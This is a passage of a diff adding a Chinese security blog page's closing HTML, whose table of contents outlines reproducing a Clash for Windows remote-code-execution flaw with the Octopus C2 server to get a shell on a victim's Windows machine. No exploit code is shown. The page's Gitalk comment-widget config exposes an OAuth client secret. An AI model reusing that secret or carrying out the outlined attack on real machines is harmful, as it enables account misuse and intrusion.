+    >https://github.com/Fndroid/clash_for_windows_pkg/issues/2710</a></p>
+<p><a class="link" href="https://httpd.apache.org/docs/2.4/install.html"  target="_blank" rel="noopener"
+    >Compiling and Installing - Apache HTTP Server Version 2.4</a></p>
+<p><a class="link" href="https://github.com/mhaskar/Octopus/"  target="_blank" rel="noopener"
+    >GitHub - mhaskar/Octopus: Open source pre-operation C2 server based on python and powershell</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/zh-cn/tags/exploit/">exploit</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/zh-cn/p/%E8%AE%BA%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%9C%B0%E5%BC%B9shell/">
+        
+        
+            <div class="article-image">
+                <img src="/zh-cn/p/%E8%AE%BA%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%9C%B0%E5%BC%B9shell/cover.b7a938a8d442d3939ea08315b3d1a46f_hu95957955e79331ec99825d9f00c6709c_9419045_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 论如何优雅地弹Shell"
+                        
+                        data-hash="md5-t6k4qNRC05OeoIMVs9Gkbw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">论如何优雅地弹Shell</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/zh-cn/p/web%E5%AE%89%E5%85%A8sqlmap%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E6%95%B4%E7%90%86/">
+        
+        
+            <div class="article-image">
+                <img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sqlmap%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E6%95%B4%E7%90%86/cover.9d82c93a778151369b9b278f395442f3_hueaab6e369cc918621c3d9ceadcb592b0_131577_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Web安全:sqlmap常用参数整理"
+                        
+                        data-hash="md5-nYLJOneBUTabmyePOVRC8w==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Web安全:sqlmap常用参数整理</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/zh-cn/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">
+        
+        
+            <div class="article-image">
+                <img src="/zh-cn/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/cover.7a00d4ec355b0228bf22cadbfd4376f9_hub6d28757c33c1ef5c0f635b7b627146b_864309_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Web安全:文件包含漏洞"
+                        
+                        data-hash="md5-egDU7DVbAii/Isrb/UN2&#43;Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Web安全:文件包含漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/zh-cn/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/">
+        
+        
+            <div class="article-image">
+                <img src="/zh-cn/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/cover.6c0349c21e246ba5c06b72ea79814838_hu7c854b3953090c9fdfa2da02ac591aa6_4062930_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Web安全:命令执行/注入(RCE)"
+                        
+                        data-hash="md5-bANJwh4ka6XAa3LqeYFIOA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Web安全:命令执行/注入(RCE)</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/">
+        
+        
+            <div class="article-image">
+                <img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/cover.83f907b854aabf08219afb59282a127f_hub39257f7b520a72e81a71654a57446e0_105468_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Web安全:SQL注入基础知识和简单绕过笔记"
+                        
+                        data-hash="md5-g/kHuFSqvwghmvtZKCoSfw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Web安全:SQL注入基础知识和简单绕过笔记</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div id="gitalk-container"></div>
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css"
+/>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.18.0/js/md5.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: "350f7151191770b41225",
+        clientSecret: "dfc2d6ff148e57ac47c9efedb4ddf9c370fc33f0",
+        repo: "kira-pgr.github.io",
+        owner: "Kira-Pgr",
+        admin: ["Kira-Pgr"],
+        distractionFreeMode: false, 
+        id: md5(location.pathname), 
+    });
+    (function () {
+        if (
+            ["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1
+        ) {
+            document.getElementById("gitalk-container").innerHTML =
+                "Gitalk comments not available by default when the website is previewed locally.";
+            return;
+        }
+        gitalk.render("gitalk-container");
+    })();
+</script>
+
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2022 - 
+        
+        2023 猫猫の博客
+    </section>
+    
+    <section class="powerby">
+        
+            For a better open source community! <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.13.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#免责声明">免责声明</a></li>
+    <li><a href="#前期准备">前期准备</a>
+      <ol>
+        <li><a href="#一个有漏洞的clash-windows-客户端">一个有漏洞的Clash Windows 客户端</a></li>
+        <li><a href="#c2工具octopus">C2工具Octopus</a></li>
+        <li><a href="#apache2">Apache2</a></li>
+      </ol>
+    </li>
+    <li><a href="#漏洞复现">漏洞复现</a>
+      <ol>
+        <li><a href="#linux攻击机器">Linux(攻击机器)</a></li>
+        <li><a href="#windows某个可怜的小白的机器">Windows(某个可怜的小白的机器)</a></li>
+        <li><a href="#成功getshell-露出恶毒的笑容">成功GetShell (露出恶毒的笑容)</a></li>
+      </ol>
+    </li>
+    <li><a href="#漏洞防御">漏洞防御</a></li>
+    <li><a href="#ref">Ref</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<script src="/js/snow.js"></script>
+<script
+    src="https://cdn.jsdelivr.net/gh/zhixuan2333/gh-blog@v0.1.0/js/ribbon.min.js"
+    integrity="sha384-UEK8ZiP3VgFNP8KnKMKDmd4pAUAOJ59Y2Jo3ED2Z5qKQf6HLHovMxq7Beb9CLPUe"
+    crossorigin="anonymous"
+    size="300"
+    alpha="0.6"
+    zindex="-1"
+    defer
+></script>
+
+    </body>
+</html>
